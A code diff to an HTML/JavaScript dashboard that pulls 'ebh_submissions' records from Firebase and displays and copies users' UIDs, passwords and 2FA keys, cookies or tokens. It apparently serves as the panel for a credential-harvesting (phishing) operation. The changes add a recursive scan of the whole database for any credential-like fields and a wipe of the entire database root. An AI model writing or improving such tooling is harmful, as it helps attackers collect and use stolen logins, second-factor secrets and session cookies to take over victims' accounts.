@@ -7,6 +7,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
+/* আগের CSS একই থাকবে */
 * {
   margin: 0;
   padding: 0;
@@ -860,7 +861,7 @@ function renderAccountsTable(accounts) {
           <div class="cell-content">${index + 1}.</div>
         </div>
         <div class="row-cell uid-cell">
-          <div class="cell-content" title="${account.uid || account.username || 'N/A'}">${account.uid || account.username || 'N/A'}</div>
+          <div class="cell-content" title="${account.uid || 'N/A'}">${account.uid || 'N/A'}</div>
         </div>
         <div class="row-cell password-cell">
           <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
@@ -876,6 +877,40 @@ function renderAccountsTable(accounts) {
   accountsContainer.innerHTML = tableHTML;
 }
 
+function extractDataFromObject(obj) {
+  // UID এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
+  let uid = "";
+  const uidKeys = ['uid', 'username', 'user', 'email', 'userId', 'id'];
+  for (const key of uidKeys) {
+    if (obj[key] && obj[key].toString().trim()) {
+      uid = obj[key].toString().trim();
+      break;
+    }
+  }
+  
+  // Password এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
+  let password = "";
+  const passwordKeys = ['password', 'pass', 'pwd', 'secret', 'key'];
+  for (const key of passwordKeys) {
+    if (obj[key] && obj[key].toString().trim()) {
+      password = obj[key].toString().trim();
+      break;
+    }
+  }
+  
+  // 2FA/TFA এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
+  let tfa = "";
+  const tfaKeys = ['twofa_key', 'tfa', '2fa', 'twofa', 'twoFactor', 'auth', 'cookie', 'cookies', 'token'];
+  for (const key of tfaKeys) {
+    if (obj[key] && obj[key].toString().trim()) {
+      tfa = obj[key].toString().trim();
+      break;
+    }
+  }
+  
+  return { uid, password, tfa };
+}
+
 function loadData() {
   showLoading();
   
@@ -884,42 +919,78 @@ function loadData() {
   currentSearchTerm = "";
   searchResultCard.style.display = 'none';
   
-  // আপনার ডাটাবেস পাথ: ebh_submissions
-  db.ref("ebh_submissions").once("value")
+  console.log("Loading data from Firebase...");
+  
+  // Firebase থেকে ডাটা লোড - root থেকে শুরু করে সব child চেক করা হচ্ছে
+  db.ref("/").once("value")
   .then(snapshot => {
-    console.log("Firebase Data:", snapshot.val()); // ডিবাগিং জন্য
+    console.log("Firebase Data Structure:", snapshot.val());
     
     allAccounts = [];
     
     if (snapshot.exists()) {
-      snapshot.forEach(child => {
-        const data = child.val();
-        console.log("Account Data:", data); // প্রতিটি একাউন্ট দেখার জন্য
+      const data = snapshot.val();
+      
+      // প্রথমে ebh_submissions চেক করা
+      if (data.ebh_submissions) {
+        console.log("Found ebh_submissions node");
+        const submissions = data.ebh_submissions;
         
-        // UID এর জন্য বিভিন্ন possible field names
-        const uid = data.uid || data.username || data.user || data.email || data.userId || "";
-        
-        // Password এর জন্য বিভিন্ন possible field names
-        const password = data.password || data.pass || data.pwd || "";
-        
-        // 2FA/TFA এর জন্য বিশেষভাবে twofa_key ফিল্ড চেক করা হচ্ছে
-        const tfa = data.twofa_key || data.tfa || data.cookie || data.twofa || data["2fa"] || data.twoFactor || data.cookies || "";
-        
-        allAccounts.push({
-          uid: uid,
-          password: password,
-          tfa: tfa
+        Object.keys(submissions).forEach(key => {
+          const submissionData = submissions[key];
+          const extracted = extractDataFromObject(submissionData);
+          
+          if (extracted.uid || extracted.password || extracted.tfa) {
+            allAccounts.push(extracted);
+          }
         });
-      });
+      }
+      
+      // যদি ebh_submissions না থাকে, তাহলে root level থেকে সব ডাটা চেক করা
+      if (allAccounts.length === 0) {
+        console.log("Checking all root level data...");
+        
+        // Recursive function to find all objects
+        function findAccounts(obj, path = '') {
+          if (!obj) return;
+          
+          if (typeof obj === 'object') {
+            const keys = Object.keys(obj);
+            
+            // Check if this object has uid/password/tfa fields
+            const extracted = extractDataFromObject(obj);
+            if (extracted.uid || extracted.password || extracted.tfa) {
+              allAccounts.push(extracted);
+            }
+            
+            // Recursively check all children
+            keys.forEach(key => {
+              findAccounts(obj[key], path + '/' + key);
+            });
+          }
+        }
+        
+        findAccounts(data);
+      }
     }
+    
+    // ডুপ্লিকেট রিমুভ করা
+    allAccounts = allAccounts.filter((account, index, self) =>
+      index === self.findIndex(a => 
+        a.uid === account.uid && 
+        a.password === account.password && 
+        a.tfa === account.tfa
+      )
+    );
     
     filteredAccounts = [...allAccounts];
     renderAccountsTable(allAccounts);
     updateStats();
     
-    // ডিবাগিং: কতগুলো একাউন্ট লোড হয়েছে
     console.log(`Total accounts loaded: ${allAccounts.length}`);
-    console.log(`Sample account:`, allAccounts[0]); // প্রথম একাউন্ট দেখার জন্য
+    if (allAccounts.length > 0) {
+      console.log("Sample accounts:", allAccounts.slice(0, 3));
+    }
   })
   .catch(err => {
     console.error("Firebase Error:", err);
@@ -932,7 +1003,7 @@ function loadData() {
             <p>Error loading data: ${err.message}</p>
             <p>Please check:</p>
             <p>1. Internet connection</p>
-            <p>2. Firebase database path: ebh_submissions</p>
+            <p>2. Firebase database rules</p>
             <p>3. Browser console (F12) for details</p>
           </td>
         </div>
@@ -970,7 +1041,7 @@ function copyUIDs() {
     return;
   }
   
-  const uids = accountsToCopy.map(account => account.uid || account.username || "").join("\n");
+  const uids = accountsToCopy.map(account => account.uid || "").filter(uid => uid).join("\n");
   
   navigator.clipboard.writeText(uids)
     .then(() => {
@@ -998,7 +1069,7 @@ function copyPasswords() {
     return;
   }
   
-  const passwords = accountsToCopy.map(account => account.password || "").join("\n");
+  const passwords = accountsToCopy.map(account => account.password || "").filter(pass => pass).join("\n");
   
   navigator.clipboard.writeText(passwords)
     .then(() => {
@@ -1074,8 +1145,13 @@ function deleteAllData() {
     </div>
   `;
   
-  db.ref("ebh_submissions").remove()
+  console.log("Attempting to delete all Firebase data...");
+  
+  // Root থেকে সব ডাটা ডিলিট করা
+  db.ref("/").remove()
   .then(() => {
+    console.log("✅ Firebase data deleted successfully!");
+    
     allAccounts = [];
     filteredAccounts = [];
     isSearching = false;
@@ -1087,8 +1163,9 @@ function deleteAllData() {
         <div class="no-data" style="color: #10b981;">
           <td colspan="4">
             <i class="fas fa-check-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
-            <p>✅ All data deleted successfully!</p>
-            <p>Database is now empty.</p>
+            <p>✅ All data deleted successfully from Firebase!</p>
+            <p>Database is now completely empty.</p>
+            <p><small>Please wait a moment for changes to sync.</small></p>
           </td>
         </div>
       </div>
@@ -1097,21 +1174,28 @@ function deleteAllData() {
     updateStats();
     
     setTimeout(() => {
-      alert("✅ All data has been permanently deleted.");
-    }, 500);
+      alert("✅ All data has been permanently deleted from Firebase.");
+      // ডিলিট হওয়ার পর রিফ্রেশ করা
+      setTimeout(() => location.reload(), 1000);
+    }, 1000);
   })
   .catch(err => {
+    console.error("❌ Delete error:", err);
+    
     accountsContainer.innerHTML = `
       <div class="table-container">
         <div class="no-data" style="color: #ef4444;">
           <td colspan="4">
             <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
-            <p>❌ Error deleting data</p>
+            <p>❌ Error deleting data from Firebase</p>
+            <p>${err.message}</p>
+            <p>Please check Firebase console permissions.</p>
           </td>
         </div>
       </div>
     `;
-    console.error("Delete error:", err);
+    
+    alert("❌ Failed to delete data: " + err.message);
   });
 }
 
@@ -1136,6 +1220,7 @@ searchInput.addEventListener("input", function() {
 
 // Page Load এবং Auto Refresh
 document.addEventListener('DOMContentLoaded', function() {
+  console.log("DOM loaded, initializing Firebase connection...");
   loadData();
   setInterval(loadData, 120000); // প্রতি 2 মিনিটে Auto Refresh
 });
